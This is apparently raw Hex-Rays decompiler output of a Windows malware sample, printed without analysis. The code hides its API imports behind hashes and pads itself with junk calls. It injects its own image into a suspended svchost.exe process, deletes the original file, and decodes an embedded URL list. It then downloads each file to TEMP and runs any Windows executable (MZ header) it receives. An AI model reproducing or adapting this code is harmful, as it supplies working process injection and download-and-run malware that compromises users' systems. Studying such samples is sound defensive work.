/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_401000(int, int, int, int, int, int, int, int, int, int, int, int, int, int);
int __stdcall sub_40100B(int, int);
void __noreturn sub_40122E(); // weak
int sub_40157B();
int start();
int __stdcall sub_401B2F(LPCSTR lpString); // idb
int __cdecl sub_401DD8(int, int, int);
void __cdecl sub_401F20(void *);
int __cdecl sub_401F50(int, int, int, _DWORD *);
// int __usercall sub_401F80@<eax>(int@<ebp>, int, unsigned int);
// int __userpurge sub_402049@<eax>(int result@<eax>, int@<ebp>, int);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401F3C; // weak
char *off_404004 = "shell32.dll"; // weak
LPCSTR off_404010 = "exe "; // idb
char byte_404018[8] = { ' ', '†', '±', 'י', '₪', '\x1D', 'ֹ', 'ֵ' }; // weak
LPCSTR off_404028 = "svch"; // idb
void *off_40402C = &unk_40316C; // weak
LPCSTR off_404030 = &unk_403169; // idb
LPCSTR off_404034 = &unk_403165; // idb
void *off_404038 = &unk_40310C; // weak
LPCSTR lpString2 = "win"; // idb
char *off_404040[3] = { "open", "\\", "et." }; // weak
LPCSTR off_404044 = "\\"; // idb
LPCSTR off_404048 = "et."; // idb
LPCSTR off_404054 = "ost."; // idb
char *off_404058[2] = { "TEMP", "kernel32.dll" }; // weak
LPCSTR lpLibFileName = "kernel32.dll"; // idb
_DWORD dword_404064[4] = { 429065504, 0, 0, 0 }; // weak
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *FreeConsole)();
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetFileSecurityA)(LPCSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
int (__stdcall *dword_4043D0)(_DWORD) = NULL; // weak
CHAR String[1024] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // weak
int dword_4047D4; // weak
int dword_4047D8; // weak
int (__stdcall *dword_4047E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4047E8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int dword_4047EC; // weak
int dword_4048A4; // weak
int (__stdcall *dword_404AB8)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404ABC)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404AC0)(_DWORD); // weak
int (__stdcall *dword_404AC4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404AC8)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404ACC)(_DWORD); // weak
CHAR Filename[260]; // idb
CHAR FileName[260]; // idb
int dword_404CD8; // weak
int dword_404D04; // weak
__int16 word_404D08; // weak
int (__stdcall *dword_404D1C)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404D20)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404D24)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404D28)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404D2C)(_DWORD); // weak
int (__stdcall *dword_404D30)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14)
{
  return 0;
}

//----- (0040100B) --------------------------------------------------------
int __stdcall sub_40100B(int a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  int i; // edi
  int j; // [esp+Ch] [ebp-4Ch]
  int v7; // [esp+10h] [ebp-48h]
  unsigned int v8; // [esp+14h] [ebp-44h]
  int v9; // [esp+18h] [ebp-40h]
  _DWORD *v10; // [esp+1Ch] [ebp-3Ch]
  CHAR String1[32]; // [esp+20h] [ebp-38h] BYREF
  CPPEH_RECORD ms_exc; // [esp+40h] [ebp-18h]

  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v10 = (_DWORD *)(a1 + *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120));
  v9 = a1 + v10[9];
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcpyA(String1, L"ז");
  lstrcpyA(String1, L"מז");
  if ( SetFileSecurityA(0, 0, 0) )
    a2 += 211426;
  lstrcpyA(String1, L"ןמז");
  ms_exc.registration.TryLevel = 0;
  if ( !SetFileSecurityA((LPCSTR)0x852, 0, 0) )
    a2 += 247559;
  ms_exc.registration.TryLevel = -1;
  v2 = a1 + v10[8];
  v3 = a1 + v10[7];
  for ( i = 0; i < v10[6]; ++i )
  {
    v8 = 0;
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v7 = a1 + *(_DWORD *)(v2 + 4 * i);
    for ( j = 0; *(_BYTE *)(j + v7); ++j )
    {
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      v8 = ((v8 >> 25) | (v8 << 7)) ^ *(char *)(j + v7) ^ 0x80;
    }
    if ( v8 == a2 )
    {
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      return a1 + *(_DWORD *)(v3 + 4 * *(unsigned __int16 *)(v9 + 2 * i));
    }
  }
  return 0;
}

//----- (0040122E) --------------------------------------------------------
void __noreturn sub_40122E()
{
  LPSTR CommandLineA; // ebx
  const CHAR *v1; // ebx
  int v2; // esi
  BOOL v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // ebx
  int v8; // esi
  int v9; // edi
  int v10; // [esp+Ch] [ebp-54h]
  int v11; // [esp+10h] [ebp-50h]
  int v12; // [esp+14h] [ebp-4Ch]
  int v13; // [esp+18h] [ebp-48h]
  int v14; // [esp+1Ch] [ebp-44h]
  int v15; // [esp+20h] [ebp-40h]
  int v16; // [esp+24h] [ebp-3Ch]
  CHAR String1[32]; // [esp+34h] [ebp-2Ch] BYREF
  int v18[3]; // [esp+54h] [ebp-Ch] BYREF

  lstrcpyA(String1, lpString2);
  lstrcatA(String1, off_404030);
  lstrcatA(String1, off_404048);
  lstrcatA(String1, off_404034);
  dword_4043D0(String1);
  dword_4043D0(off_404004);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  FreeConsole();
  CommandLineA = GetCommandLineA();
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  while ( *CommandLineA != 32 )
    ++CommandLineA;
  v1 = CommandLineA + 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( v3 )
      break;
    Sleep(0xF0u);
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v3 = DeleteFileA(v1);
    ++v2;
  }
  while ( v2 <= 50 );
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  memset(v18, 0, sizeof(v18));
  v4 = 0;
  v5 = 0;
  while ( 1 )
  {
    sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    v16 = 0;
    v14 = 0;
    v15 = 0;
    v6 = 0;
    v13 = 0;
    do
    {
      if ( v13 == 8 )
        v13 = 0;
      String[v6] = byte_404018[v13] ^ *((_BYTE *)off_404038 + v16);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      if ( String[v6] == 44 )
      {
        String[v6] = 0;
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
        if ( v18[v14] )
        {
          ++v15;
        }
        else if ( sub_401B2F(String) )
        {
          v18[v14] = 1;
          ++v15;
        }
        ++v14;
        v6 = -1;
      }
      ++v13;
      ++v6;
      ++v16;
    }
    while ( v16 < 88 );
    if ( v15 == 3 )
      v4 = 1;
    ++v5;
    if ( !v4 )
      Sleep(0x37C23u);
    if ( v5 >= 3 || v4 )
    {
      if ( !v4 )
      {
        v7 = 0;
        v8 = 0;
        do
        {
          v12 = 0;
          v10 = 0;
          v11 = 0;
          v9 = 0;
          do
          {
            String[v9] = *((_BYTE *)off_40402C + v12 + 1) ^ *((_BYTE *)off_40402C + v12);
            if ( String[v9] == 44 )
            {
              sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
              String[v9] = 0;
              if ( v18[v10] )
              {
                ++v11;
              }
              else if ( sub_401B2F(String) )
              {
                v18[v10] = 1;
                ++v11;
              }
              ++v10;
              v9 = -1;
            }
            ++v9;
            v12 += 3;
          }
          while ( v12 < 264 );
          if ( v11 == 3 )
            v7 = 1;
          ++v8;
          if ( !v7 )
            Sleep(0x41BC3u);
        }
        while ( v8 < 3 && !v7 );
      }
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      ExitProcess(0);
    }
  }
}
// 40122E: using guessed type void __noreturn sub_40122E();
// 404004: using guessed type char *off_404004;
// 40402C: using guessed type void *off_40402C;
// 404038: using guessed type void *off_404038;
// 4043D0: using guessed type int (__stdcall *dword_4043D0)(_DWORD);

//----- (0040157B) --------------------------------------------------------
int sub_40157B()
{
  HMODULE ModuleHandleA; // ebx
  char *v1; // esi
  int v2; // eax
  char v4[4]; // [esp+8h] [ebp-4h] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v1 = (char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15);
  v2 = dword_4047E4(dword_4047D4, ModuleHandleA, *((_DWORD *)v1 + 20), 12288, 64);
  dword_4047E8(dword_4047D4, v2, ModuleHandleA, *((_DWORD *)v1 + 20), v4);
  dword_4047EC = 65543;
  dword_404AB8(dword_4047D8, &dword_4047EC);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_4048A4 = (int)sub_40122E;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404ABC(dword_4047D8, &dword_4047EC);
  return dword_404AC0(dword_4047D8);
}
// 40122E: using guessed type void __noreturn sub_40122E();
// 4047D4: using guessed type int dword_4047D4;
// 4047D8: using guessed type int dword_4047D8;
// 4047E4: using guessed type int (__stdcall *dword_4047E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4047E8: using guessed type int (__stdcall *dword_4047E8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4047EC: using guessed type int dword_4047EC;
// 4048A4: using guessed type int dword_4048A4;
// 404AB8: using guessed type int (__stdcall *dword_404AB8)(_DWORD, _DWORD);
// 404ABC: using guessed type int (__stdcall *dword_404ABC)(_DWORD, _DWORD);
// 404AC0: using guessed type int (__stdcall *dword_404AC0)(_DWORD);
// 40157B: using guessed type char var_4[4];

//----- (0040168C) --------------------------------------------------------
int start()
{
  HMODULE LibraryA; // ebx
  int v1; // ebx
  int v2; // ebx
  CHAR String1[32]; // [esp+4h] [ebp-20h] BYREF

  LibraryA = LoadLibraryA(lpLibFileName);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  CloseHandle((HANDLE)9);
  dword_404AC4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, -553390581);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  GetFileType(HANDLE_FLAG_PROTECT_FROM_CLOSE|HANDLE_FLAG_INHERIT|0x4);
  GetModuleHandleA(0);
  dword_4047E4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, 59628650);
  dword_4047E8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, 1729354233);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404AB8 = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B((int)LibraryA, 858687203);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404ABC = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B((int)LibraryA, 858697443);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404AC0 = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, -356852749);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404AC8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, 1169791454);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404ACC = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, 78794705);
  dword_4043D0 = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, 1503585518);
  GetModuleFileNameA(0, Filename, 0x104u);
  lstrcpyA(FileName, off_404028);
  lstrcatA(FileName, off_404054);
  lstrcatA(FileName, off_404010);
  lstrcatA(FileName, Filename);
  dword_404CD8 = 68;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404D04 = 1;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  word_404D08 = 2;
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404AC4(0, FileName, 0, 0, 0, 4, 0, 0, &dword_404CD8, &dword_4047D4);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  lstrcpyA(String1, lpString2);
  lstrcatA(String1, off_404030);
  lstrcatA(String1, off_404048);
  lstrcatA(String1, off_404034);
  v1 = dword_4043D0(String1);
  dword_404D1C = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B(v1, -1218482486);
  dword_404D20 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, -1855235809);
  dword_404D24 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, 558816170);
  dword_404D28 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, -2095951954);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404D2C = (int (__stdcall *)(_DWORD))sub_40100B(v1, -1431855648);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  v2 = dword_4043D0(off_404004);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404D30 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v2, -835081135);
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  sub_40157B();
  sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
  dword_404ACC(0);
  return 0;
}
// 404004: using guessed type char *off_404004;
// 4043D0: using guessed type int (__stdcall *dword_4043D0)(_DWORD);
// 4047D4: using guessed type int dword_4047D4;
// 4047E4: using guessed type int (__stdcall *dword_4047E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4047E8: using guessed type int (__stdcall *dword_4047E8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404AB8: using guessed type int (__stdcall *dword_404AB8)(_DWORD, _DWORD);
// 404ABC: using guessed type int (__stdcall *dword_404ABC)(_DWORD, _DWORD);
// 404AC0: using guessed type int (__stdcall *dword_404AC0)(_DWORD);
// 404AC4: using guessed type int (__stdcall *dword_404AC4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404AC8: using guessed type int (__stdcall *dword_404AC8)(_DWORD, _DWORD, _DWORD);
// 404ACC: using guessed type int (__stdcall *dword_404ACC)(_DWORD);
// 404CD8: using guessed type int dword_404CD8;
// 404D04: using guessed type int dword_404D04;
// 404D08: using guessed type __int16 word_404D08;
// 404D1C: using guessed type int (__stdcall *dword_404D1C)(_DWORD, _DWORD);
// 404D20: using guessed type int (__stdcall *dword_404D20)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404D24: using guessed type int (__stdcall *dword_404D24)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404D28: using guessed type int (__stdcall *dword_404D28)(_DWORD, _DWORD, _DWORD, _DWORD);
// 404D2C: using guessed type int (__stdcall *dword_404D2C)(_DWORD);
// 404D30: using guessed type int (__stdcall *dword_404D30)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401B2F) --------------------------------------------------------
int __stdcall sub_401B2F(LPCSTR lpString)
{
  int v1; // esi
  int v2; // edi
  int i; // eax
  HANDLE FileA; // ebx
  int v6; // [esp+Ch] [ebp-41Ch]
  int v7; // [esp+10h] [ebp-418h]
  int v8; // [esp+14h] [ebp-414h]
  const CHAR *lpString2; // [esp+18h] [ebp-410h]
  char Buffer[1024]; // [esp+1Ch] [ebp-40Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+41Ch] [ebp-Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+420h] [ebp-8h] BYREF
  int v13; // [esp+424h] [ebp-4h] BYREF

  v13 = 7;
  v1 = 0;
  if ( dword_404D1C(&v13, 0) )
  {
    v8 = dword_404D20(0, 0, 0, 0, 0);
    v2 = dword_404D24(v8, lpString, 0, 0, 0x80000000, 0);
    v1 = 0;
    if ( v2 )
    {
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      for ( i = lstrlenA(lpString); i > 0; --i )
      {
        if ( lpString[i] == 47 )
        {
          lpString2 = &lpString[i + 1];
          break;
        }
      }
      dword_404AC8(off_404058[0], FileName, 260);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      lstrcatA(FileName, off_404044);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      lstrcatA(FileName, lpString2);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      FileA = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0, 0);
      v7 = 0;
      v6 = 0;
      do
      {
        dword_404D28(v2, Buffer, 1024, &nNumberOfBytesToWrite);
        if ( !v6 )
        {
          v6 = 1;
          if ( Buffer[0] == 77 )
          {
            v6 = 1;
            if ( Buffer[1] == 90 )
            {
              v7 = 1;
              v6 = 1;
            }
          }
        }
        sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
        WriteFile(FileA, Buffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
      }
      while ( nNumberOfBytesToWrite );
      CloseHandle(FileA);
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
      Sleep(0xFDu);
      v1 = 0;
      if ( v7 )
      {
        dword_404D30(0, off_404040[0], FileName, 0, 0, 8);
        v1 = 1;
      }
      sub_401000(6, 8, 8, 6, 8, 6, 104, 104, 104, 104, 104, 104, 104, 104);
    }
    dword_404D2C(v2);
    dword_404D2C(v8);
  }
  return v1;
}
// 401C4A: variable 'lpString2' is possibly undefined
// 404040: using guessed type char *off_404040[3];
// 404058: using guessed type char *off_404058[2];
// 404AC8: using guessed type int (__stdcall *dword_404AC8)(_DWORD, _DWORD, _DWORD);
// 404D1C: using guessed type int (__stdcall *dword_404D1C)(_DWORD, _DWORD);
// 404D20: using guessed type int (__stdcall *dword_404D20)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404D24: using guessed type int (__stdcall *dword_404D24)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404D28: using guessed type int (__stdcall *dword_404D28)(_DWORD, _DWORD, _DWORD, _DWORD);
// 404D2C: using guessed type int (__stdcall *dword_404D2C)(_DWORD);
// 404D30: using guessed type int (__stdcall *dword_404D30)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401DD8) --------------------------------------------------------
int __cdecl sub_401DD8(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_401F80(a2 + 16, a2, 0xFFFFFFFF);
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *(_DWORD *)(a2 - 4) = v12;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
      if ( v7 )
      {
        v8 = v7(0, 0);
        v4 = v3[3];
        if ( v8 )
        {
          if ( v8 < 0 )
            return 0;
          v9 = *(_DWORD *)(v4 + 8);
          sub_401F20((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_401F80(v4 + 16, v4, v5);
          sub_402049(*(_DWORD *)(v9 + 12 * v5 + 8), v4 + 16, 1);
          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v9 + 4 * v10);
          v4 = 0;
          v5 = 0;
          (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 401E9A: variable 'v10' is possibly undefined

//----- (00401F20) --------------------------------------------------------
void __cdecl sub_401F20(void *a1)
{
  RtlUnwind(a1, &loc_401F3C, 0, 0);
}

//----- (00401F50) --------------------------------------------------------
int __cdecl sub_401F50(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    return 3;
  }
  return result;
}

//----- (00401F80) --------------------------------------------------------
int __usercall sub_401F80@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_401F50;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_402049(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        ExceptionList,
        v8);
    }
  }
  return result;
}
// 401FE7: variable 'ExceptionList' is possibly undefined
// 401FE7: variable 'v8' is possibly undefined

//----- (00402049) --------------------------------------------------------
int __userpurge sub_402049@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_404064[2] = a3;
  dword_404064[1] = result;
  dword_404064[3] = a2;
  return result;
}
// 404064: using guessed type _DWORD dword_404064[4];

// nfuncs=12 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
